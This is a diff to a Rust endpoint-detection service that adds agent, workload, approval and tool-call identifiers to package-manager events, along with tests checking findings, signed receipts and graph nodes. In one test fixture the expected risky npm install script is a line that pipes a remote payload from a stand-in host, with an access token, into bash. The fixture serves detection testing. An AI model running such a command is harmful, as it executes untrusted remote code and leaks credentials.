@@ -9311,6 +9311,10 @@ fn package_manager_event_metadata(
         serde_json::Value::String(event.manager.as_str().to_string()),
     );
     for (key, value) in [
+        ("agentId", event.agent_id.as_deref()),
+        ("workloadId", event.workload_id.as_deref()),
+        ("approvalId", event.approval_id.as_deref()),
+        ("toolCallId", event.tool_call_id.as_deref()),
         ("packageName", event.package.as_deref()),
         ("packageManagerPhase", Some(event.phase.as_str())),
         ("workingDirectory", event.working_directory.as_deref()),
@@ -23226,9 +23230,31 @@ mod tests {
         let app = Router::new()
             .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
             .with_state(Arc::new(test_state()));
+        let mut metadata = BTreeMap::new();
+        metadata.insert(
+            "agentId".to_string(),
+            serde_json::Value::String("agent-supply-1".to_string()),
+        );
+        metadata.insert(
+            "workloadId".to_string(),
+            serde_json::Value::String("workload-supply-1".to_string()),
+        );
+        metadata.insert(
+            "approvalId".to_string(),
+            serde_json::Value::String("approval-supply-1".to_string()),
+        );
+        metadata.insert(
+            "toolCallId".to_string(),
+            serde_json::Value::String("tool-call-supply-1".to_string()),
+        );
         let observation = EndpointObservation {
+            observation_id: "obs-supply-identity-1".to_string(),
+            host_id: Some("host-supply-1".to_string()),
+            user_id: Some("user-supply-1".to_string()),
+            session_id: Some("session-supply-1".to_string()),
             process: EndpointProcess {
                 image: Some("/usr/local/bin/npm".to_string()),
+                process_guid: Some("proc-supply-1".to_string()),
                 signing: CodeSignatureStatus {
                     trust: SignatureTrust::Signed,
                     ..CodeSignatureStatus::default()
@@ -23243,6 +23269,7 @@ mod tests {
                     .to_string(),
                 working_directory: Some("/tmp/pkg".to_string()),
             },
+            metadata,
             ..EndpointObservation::default()
         };
         let body = serde_json::json!({
@@ -23281,6 +23308,26 @@ mod tests {
             .any(|item| item["key"] == "script"
                 && item["value"]
                     == "curl https://example.invalid/payload.sh?access_token=[REDACTED] | bash"));
+        let finding_evidence = payload["findings"][0]["evidence"]
+            .as_array()
+            .unwrap_or_else(|| panic!("missing supply-chain identity evidence"));
+        for (key, value) in [
+            ("hostId", "host-supply-1"),
+            ("userId", "user-supply-1"),
+            ("sessionId", "session-supply-1"),
+            ("processGuid", "proc-supply-1"),
+            ("agentId", "agent-supply-1"),
+            ("workloadId", "workload-supply-1"),
+            ("approvalId", "approval-supply-1"),
+            ("toolCallId", "tool-call-supply-1"),
+        ] {
+            assert!(
+                finding_evidence
+                    .iter()
+                    .any(|item| item["key"] == key && item["value"] == value),
+                "missing supply-chain identity evidence {key}"
+            );
+        }
         assert_eq!(payload["receipt_count"], 1);
         assert!(!payload.to_string().contains("MY_RAW_SECRET"));
 
@@ -23309,6 +23356,33 @@ mod tests {
             endpoint_decision["actor"]["endpointId"],
             serde_json::Value::String("test-agent".to_string())
         );
+        assert_eq!(endpoint_decision["actor"]["hostId"], "host-supply-1");
+        assert_eq!(endpoint_decision["actor"]["userId"], "user-supply-1");
+        assert_eq!(endpoint_decision["actor"]["sessionId"], "session-supply-1");
+        assert_eq!(endpoint_decision["actor"]["agentId"], "agent-supply-1");
+        assert_eq!(
+            endpoint_decision["actor"]["workloadId"],
+            "workload-supply-1"
+        );
+        assert_eq!(
+            endpoint_decision["actor"]["approvalId"],
+            "approval-supply-1"
+        );
+        for (key, value) in [
+            ("hostId", "host-supply-1"),
+            ("userId", "user-supply-1"),
+            ("sessionId", "session-supply-1"),
+            ("processGuid", "proc-supply-1"),
+            ("agentId", "agent-supply-1"),
+            ("workloadId", "workload-supply-1"),
+            ("approvalId", "approval-supply-1"),
+            ("toolCallId", "tool-call-supply-1"),
+        ] {
+            assert!(
+                receipt_evidence_hash_matches(&signed, key, value),
+                "missing signed supply-chain evidence {key}"
+            );
+        }
     }
 
     #[tokio::test]
@@ -35521,6 +35595,10 @@ guards:
                     "hostId": "host-pkg-1",
                     "userId": "user-pkg-1",
                     "sessionId": "session-pkg-1",
+                    "agentId": "agent-pkg-1",
+                    "workloadId": "workload-pkg-1",
+                    "approvalId": "approval-pkg-1",
+                    "toolCallId": "tool-call-pkg-1",
                     "manager": "npm",
                     "package": "@acme/install-hook",
                     "phase": "postinstall",
@@ -35582,6 +35660,10 @@ guards:
         );
         assert_eq!(observation["metadata"]["collectorKind"], "package_manager");
         assert_eq!(observation["metadata"]["providerId"], "package_manager.npm");
+        assert_eq!(observation["metadata"]["agentId"], "agent-pkg-1");
+        assert_eq!(observation["metadata"]["workloadId"], "workload-pkg-1");
+        assert_eq!(observation["metadata"]["approvalId"], "approval-pkg-1");
+        assert_eq!(observation["metadata"]["toolCallId"], "tool-call-pkg-1");
         assert_eq!(
             observation["metadata"]["packageManagerPhase"],
             "postinstall"
@@ -35590,6 +35672,55 @@ guards:
             payload["findings"][0]["ruleId"],
             "supply_chain.install_script.risky"
         );
+        let finding_evidence = payload["findings"][0]["evidence"]
+            .as_array()
+            .unwrap_or_else(|| panic!("missing package-manager finding evidence"));
+        for (key, value) in [
+            ("hostId", "host-pkg-1"),
+            ("userId", "user-pkg-1"),
+            ("sessionId", "session-pkg-1"),
+            ("processGuid", "proc-pkg-npm-1"),
+            ("agentId", "agent-pkg-1"),
+            ("workloadId", "workload-pkg-1"),
+            ("approvalId", "approval-pkg-1"),
+            ("toolCallId", "tool-call-pkg-1"),
+        ] {
+            assert!(
+                finding_evidence
+                    .iter()
+                    .any(|item| item["key"] == key && item["value"] == value),
+                "missing package-manager finding evidence {key}"
+            );
+        }
+        let signed: SignedReceipt = serde_json::from_value(payload["receipts"][0].clone())
+            .unwrap_or_else(|e| panic!("failed to decode package-manager receipt: {e}"));
+        let endpoint_decision = signed
+            .receipt
+            .metadata
+            .as_ref()
+            .and_then(|metadata| metadata.get("endpointDecision"))
+            .unwrap_or_else(|| panic!("missing package-manager endpoint decision"));
+        assert_eq!(endpoint_decision["actor"]["hostId"], "host-pkg-1");
+        assert_eq!(endpoint_decision["actor"]["userId"], "user-pkg-1");
+        assert_eq!(endpoint_decision["actor"]["sessionId"], "session-pkg-1");
+        assert_eq!(endpoint_decision["actor"]["agentId"], "agent-pkg-1");
+        assert_eq!(endpoint_decision["actor"]["workloadId"], "workload-pkg-1");
+        assert_eq!(endpoint_decision["actor"]["approvalId"], "approval-pkg-1");
+        for (key, value) in [
+            ("hostId", "host-pkg-1"),
+            ("userId", "user-pkg-1"),
+            ("sessionId", "session-pkg-1"),
+            ("processGuid", "proc-pkg-npm-1"),
+            ("agentId", "agent-pkg-1"),
+            ("workloadId", "workload-pkg-1"),
+            ("approvalId", "approval-pkg-1"),
+            ("toolCallId", "tool-call-pkg-1"),
+        ] {
+            assert!(
+                receipt_evidence_hash_matches(&signed, key, value),
+                "missing package-manager signed evidence {key}"
+            );
+        }
         assert!(!payload.to_string().contains("MY_RAW_SECRET"));
 
         let body = serde_json::json!({ "observations": [] });
@@ -35617,6 +35748,15 @@ guards:
             .values()
             .any(|node| node["kind"] == "package_script"));
         assert!(graph_nodes.values().any(|node| node["kind"] == "process"));
+        assert!(graph_nodes
+            .values()
+            .any(|node| node["kind"] == "agent" && node["label"] == "agent-pkg-1"));
+        assert!(graph_nodes
+            .values()
+            .any(|node| node["kind"] == "workload" && node["label"] == "workload-pkg-1"));
+        assert!(graph_nodes
+            .values()
+            .any(|node| node["kind"] == "approval" && node["label"] == "approval-pkg-1"));
     }
 
     #[tokio::test]
